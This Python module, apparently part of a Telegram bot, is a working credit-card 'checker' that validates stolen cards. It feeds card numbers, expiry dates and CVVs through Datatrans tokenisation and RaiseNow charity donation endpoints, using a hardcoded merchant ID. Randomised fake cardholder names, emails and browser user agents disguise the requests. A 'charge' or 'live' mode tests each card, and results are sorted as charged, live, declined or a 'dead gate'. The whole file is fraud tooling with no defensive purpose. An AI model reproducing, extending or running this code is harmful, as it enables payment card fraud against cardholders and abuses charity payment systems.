# checkers/multi_link_checker.py
import requests
import json
import logging
import random
import os
import time

from telegram.helpers import escape_markdown

# --- CONFIGURATION ---
MULTI_LINK_FILE = "multi_link_data.json"
logger = logging.getLogger(__name__)

# --- HELPER FUNCTIONS (COPIED FROM MAIN FOR INDEPENDENCE) ---
def load_json_file(filename, default_data={}):
    """Loads data from a JSON file."""
    if not os.path.exists(filename):
        return default_data
    try:
        with open(filename, "r", encoding='utf-8') as f:
            return json.load(f)
    except (json.JSONDecodeError, FileNotFoundError):
        return default_data

def generate_random_string(length=8):
    """Generates a random string of characters."""
    import string
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))

def random_email():
    """Generates a random email address."""
    import string
    prefix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(8, 15)))
    domain = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 10)))
    return f"{prefix}@{domain}.com"

def random_user_agent():
    """Generates a random realistic User-Agent string."""
    chrome_major = random.randint(100, 125)
    chrome_build = random.randint(0, 6500)
    chrome_patch = random.randint(0, 250)
    win_major = random.randint(10, 11)
    win_minor = random.randint(0, 3)
    webkit_major = random.randint(537, 605)
    webkit_minor = random.randint(36, 99)
    safari_version = f"{webkit_major}.{webkit_minor}"
    chrome_version = f"{chrome_major}.0.{chrome_build}.{chrome_patch}"
    win_version = f"{win_major}.{win_minor}; Win64; x64"
    return (
        f"Mozilla/5.0 (Windows NT {win_version}) "
        f"AppleWebKit/{safari_version} (KHTML, like Gecko) "
        f"Chrome/{chrome_version} Safari/{safari_version}"
    )

def make_request_with_retry(session, method, url, max_retries=5, cancellation_event=None, **kwargs):
    """Makes an HTTP request with retry logic."""
    last_exception = None
    for attempt in range(max_retries):
        if cancellation_event and cancellation_event.is_set():
            return None, "Operation cancelled by user"
        
        try:
            response = session.request(method, url, **kwargs)
            return response, None
        except requests.exceptions.RequestException as e:
            last_exception = e
            wait_time = attempt + 1
            logger.warning(f"Attempt {attempt + 1}/{max_retries} for {url} failed: {e}. Retrying in {wait_time}s...")
            time.sleep(wait_time)
    
    final_error_message = f"Retry: All {max_retries} retry attempts for {url} failed. Last error: {last_exception}"
    logger.error(final_error_message)
    return None, final_error_message

def check_card_multi_link(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_multi_link_mode_func, _get_charge_value, custom_charge_amount=None):
    """
    Logic for the special Multi-Link check mode.
    This function randomly selects a pre-validated link and its parameters to check a card.
    """
    # Load all available and validated links
    all_links = load_json_file(MULTI_LINK_FILE)
    if not isinstance(all_links, list) or not all_links:
        return 'error', line, "Multi-Link Error: No valid links found in the database. Please use /addlink.", bin_info

    # Randomly pick one link configuration
    try:
        link_config = random.choice(all_links)
        cd = link_config['cd']
        account_uuid = link_config['account_uuid']
        solution_uuid = link_config['solution_uuid']
        profile = link_config['profile']
    except (KeyError, IndexError):
        return 'error', line, "Multi-Link Error: A link in the database is malformed.", bin_info

    # Get the current mode (charge or live) for Multi-Link
    multi_link_mode_data = get_multi_link_mode_func()
    mode = multi_link_mode_data.get('mode', 'charge') # Default to charge if not set

    try:
        user_agent = random_user_agent()
        
        # Random personal info
        first_name = generate_random_string(random.randint(12, 20))
        last_name = generate_random_string(random.randint(10, 20))
        cardholder = f"{first_name} {last_name}"
        email = random_email()

        # Step 1: Tokenize card (this part is relatively standard)
        # Using a randomized formId just in case
        random_form_part = ''.join(random.choices('0123456789', k=12))
        form_id = f"2508080{random_form_part}"

        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://pay.datatrans.com",
            "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField",
            "User-Agent": user_agent,
            "X-Requested-With": "XMLHttpRequest"
        }
        
        # Use a consistent merchantId, as it seems to be shared
        merchant_id = "3000022877"

        tokenize_payload = {
            "mode": "TOKENIZE",
            "formId": form_id,
            "cardNumber": cc,
            "cvv": cvv,
            "paymentMethod": "ECA",
            "merchantId": merchant_id,
            "browserUserAgent": user_agent,
            "browserJavaEnabled": "false",
            "browserLanguage": "vi-VN",
            "browserColorDepth": "24",
            "browserScreenHeight": "1152",
            "browserScreenWidth": "2048",
            "browserTZ": "-420"
        }

        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Tokenize Error: {error}", bin_info
        if not token_response: return 'error', line, "HTTP Error with no response during Tokenization", bin_info

        if "Card number not allowed in production" in token_response.text:
            return 'decline', line, 'CARD_NOT_ALLOWED_DECLINE', bin_info

        try:
            token_data = token_response.json()
            if "error" in token_data and "message" in token_data.get("error", {}):
                 return 'decline', line, token_data["error"]["message"], bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", "Unknown error at Tokenize"), bin_info
        except json.JSONDecodeError:
            if token_response.status_code != 200:
                return 'error', line, f"HTTP Error {token_response.status_code} during Tokenization", bin_info
            return 'error', line, "Tokenize response was not JSON", bin_info

        # Step 2: Make request based on mode (charge or live)
        payment_headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://donate.raisenow.io",
            "Referer": "https://donate.raisenow.io/",
            "User-Agent": user_agent
        }
        
        base_payload = {
            "account_uuid": account_uuid,
            "test_mode": False,
            "create_supporter": False,
            "supporter": {
                "locale": "en",
                "first_name": first_name,
                "last_name": last_name,
                "email": email,
                "email_permission": True,
                "raisenow_parameters": {
                    "integration": {"opt_in": {"email": True}}
                }
            },
            "raisenow_parameters": {
                "analytics": {
                    "channel": "paylink",
                    "preselected_amount": "75000",
                    "suggested_amounts": "[75000]",
                    "user_agent": user_agent
                },
                "solution": {
                    "uuid": solution_uuid,
                    "name": "Berlin Marathon - Runner", # Name is likely not critical
                    "type": "donate"
                },
                "product": {
                    "name": "tamaro",
                    "source_url": f"https://donate.raisenow.io/{cd}?lng=en",
                    "uuid": "self-service",
                    "version": "2.16.0"
                }
            },
            "custom_parameters": {
                "campaign_id": "rn-bm-2025",
                "campaign_subid": ""
            },
            "payment_information": {
                "brand_code": "eca", # Generic for Visa/MC
                "cardholder": cardholder,
                "expiry_month": mes.zfill(2),
                "expiry_year": ano,
                "transaction_id": transaction_id
            },
            "profile": profile,
            "return_url": f"https://donate.raisenow.io/{cd}?lng=en&rnw-view=payment_result",
        }

        # --- CHARGE MODE ---
        if mode == 'charge':
            # Use a generic charge amount for this dynamic gate
            charge_value = _get_charge_value('dalink', custom_charge_amount)
            payment_url = "https://api.raisenow.io/payments"
            payment_payload = base_payload.copy()
            payment_payload["amount"] = {"currency": "EUR", "value": charge_value}

            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"MultiLink Payment Error: {error}", bin_info
            if not payment_response: return 'error', line, "HTTP Error with no response during MultiLink Payment", bin_info
            
            response_text = payment_response.text
            response_to_return = f"[Link: {cd}] " + response_text
            
            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, f'GATE_DIED: [Link: {cd}] Forbidden', bin_info
            if '"payment_status":"succeeded"' in response_text: return 'success', line, f'CHARGED_{charge_value}', bin_info
            elif '"payment_status":"failed"' in response_text: return 'decline', line, response_to_return, bin_info
            elif '"action":{"action_type":"redirect"' in response_text: return 'custom', line, response_to_return, bin_info
            elif '"3d_secure_2"' in response_text: return 'custom', line, response_to_return, bin_info
            else: return 'unknown', line, response_to_return, bin_info
        
        # --- LIVE CHECK MODE ---
        else:
            payment_url = "https://api.raisenow.io/payment-sources"
            payment_payload = base_payload.copy()
            payment_payload["amount"] = {"currency": "EUR", "value": 50}
            
            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"MultiLink Source Error: {error}", bin_info
            if not payment_response: return 'error', line, "HTTP Error with no response during MultiLink Source", bin_info

            response_text = payment_response.text
            response_to_return = f"[Link: {cd}] " + response_text

            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, f'GATE_DIED: [Link: {cd}] Forbidden', bin_info
            if '"payment_source_status":"pending"' in response_text: return 'live_success', line, response_to_return, bin_info
            elif '"payment_status":"failed"' in response_text or '"payment_source_status":"failed"' in response_text: return 'decline', line, response_to_return, bin_info
            else: return 'unknown', line, response_to_return, bin_info

    except Exception as e:
        logger.error(f"Unknown error in Multi-Link checker for line '{line}': {e}", exc_info=True)
        return 'error', line, f"Multi-Link System Error: {e}", bin_info
